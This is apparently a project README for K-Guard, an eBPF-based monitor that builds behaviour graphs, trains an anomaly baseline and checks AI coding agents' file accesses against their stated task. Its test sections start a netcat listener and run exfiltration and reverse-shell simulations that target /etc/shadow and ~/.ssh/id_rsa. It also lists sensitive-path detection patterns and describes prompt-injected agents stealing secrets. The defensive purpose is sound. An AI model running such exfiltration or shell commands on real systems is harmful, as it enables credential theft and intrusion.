# K-Guard Pipeline

An interactive kernel-space runtime monitoring and behavioral visualization pipeline driven by eBPF, `libbpf`, and NetworkX.

## Prerequisites

Install the required system build dependencies and generate the `vmlinux.h` header file from your running kernel:

```bash
sudo apt update
sudo apt install -y clang llvm libbpf-dev libelf-dev build-essential bpftool python3-pip
pip3 install -r requirements.txt

# Generate the kernel definition header
mkdir include && bpftool btf dump file /sys/kernel/btf/vmlinux format c > include/vmlinux.h
```

## Compilation
```
make clean && make
```

## Execution
```
sudo ./monitor | python3 src/user/graphengine.py
```

## Viewing the live Topology

The engine auto-saves updates to disk every 5 seconds under `output/`. Open the generated interactive
standalone webpage from that directory.

On Linux: 
```
xdg-open output/kguard_interactive_graph.html
```
On macOS:
```
open output/kguard_interactive_graph.html
```

## Training the Baseline Model

Before `ml/detector.py` can flag anomalies meaningfully, it needs a trained
baseline of normal activity. Do this once, and again whenever usage
patterns change.

### 1. Capture clean sessions

Run the monitor through different non-attack workloads (idle, dev work,
updates, installs, etc.) — never while an attack simulation is running.
Save each capture under a unique name (the monitor overwrites the same
file every run):

```bash
mkdir -p output/baseline_captures
cp output/system_behavior_graph.gexf output/baseline_captures/session_$(date +%Y%m%d_%H%M%S)_idle.gexf
```

Aim for 4+ sessions across different workload types.

### 2. Train

```bash
# regular
python3 -m ml.train

# force-promote this run even if it looks worse than the current model
python3 -m ml.train --force
```

Models are saved under `ml/models/`. A new run only replaces the active
`baseline_model.joblib` if it's at least as good as the current one;
`--force` overrides that check.

### Full test run (capture → attack → detect)

Run these **sequentially**, each in its own terminal:

```bash
# Terminal 1 — start the capture pipeline
sudo ./monitor | python3 src/user/graphengine.py
```

```bash
# Terminal 2 — start the attacker's listener
nc -lvnp 9999
```

```bash
# Terminal 3 — run the exfiltration simulation
python3 script/exfil.py
```
For custom attacker's ip, attacker's port and file, use following command:
```
python3 script/exfil.py --ip <custom_IP> --port <custom_PORT> --file <custom_file (For ex: /etc/shadow, /etc/passwd, ~/.ssh/id_rsa)>
```
Wait for `exfil.py` to print `[+] Exfiltration complete.`, then go back to **Terminal 1** and
press `Ctrl+C` to stop the monitor and flush the final graph to
`output/system_behavior_graph.gexf`.

Finally, run the detector:

```bash
python3 -m ml.detector
```
`ml/detector.py` automatically loads `ml/models/baseline_model.joblib`
### For Reverse Shell Simulation (capture → attack → detect) using KGUARD-GUI
```bash
# Terminal 1 — start the Kguard-gui
python3 kguard_gui.py
```
Click "Start Monitor"

```bash
# Terminal 2 — start the attacker's listener
nc -lvnp 9999
```

```bash
# Terminal 3 — run the reverse shell simulation
python3 script/revsh.py
```
Back to the K-Guard GUI, Click "Stop & Save Graph".
Detect the attack by clicking "Run ML Detector"

## Intent-Aware Pipeline for AI Agent Workloads

K-Guard can validate an AI coding agent's file accesses against the task
it says it's doing, catching the case where a
prompt-injected agent opens `~/.ssh/id_rsa`, `/etc/shadow`, `.env`, etc.
for a task that never mentions them.

### 1. Wrap the agent's subprocess creation with IntentShim

```python
from src.user.intent_shim import IntentShim

shim = IntentShim()
proc = shim.run(
    ["python3", "backup_script.py"],
    task_description="Back up project config files to S3",
)
proc.wait()
```

`IntentShim.run()` registers the task description against the child's PID
in the kernel's `intent_map` *before* the child ever calls `exec()`.
`monitor` must already be running
for the write to have anywhere to land; if it isn't (or `bpftool`/`sudo`
isn't available), the shim logs a warning and the child still runs
normally, just without intent context for that run.

### 2. Run the normal capture pipeline

```bash
sudo ./monitor | python3 src/user/graphengine.py
```

Every `FILE_OPEN` event from a PID with a registered intent is checked
against `src/user/intent_validator.py`'s sensitive-path patterns (`.ssh/`,
`/etc/shadow`, `.gnupg/`, `.env`, `credentials`). An unjustified sensitive
open prints an `[INTENT_VIOLATION]` line to the console and marks the
process node in the graph with `security_label: INTENT_VIOLATION`, you
can see it in the interactive graph or in `output/system_behavior_graph.gexf`.

PIDs with no registered intent (i.e. not launched through IntentShim)
are unaffected and continue to go through the standard, non-intent
anomaly pipeline only, per Section 3.6.3's step 1.

### Try it without root/eBPF

`src/user/intent_validator.py` is pure Python with no kernel dependency
and has a small built-in self-test:

```bash
python3 src/user/intent_validator.py
```

### Benchmark the validation backends

The labeled intent-aware benchmark lives under `benchmarks/intent_aware/`.
It compares the default keyword rule against the TF-IDF backend and the
optional local embedding backend, then writes a Markdown/JSON report plus
calibrated backend configs.

```bash
python3 benchmarks/intent_aware/run_benchmark.py
```

The benchmark corpus is stored in `benchmarks/intent_aware/dataset.json`.
The current run emits its report to `benchmarks/intent_aware/results/` and
persists backend thresholds under `benchmarks/intent_aware/artifacts/`.
`sentence-transformers` is only needed if you want the embedding backend
to run; the keyword backend remains the zero-config default.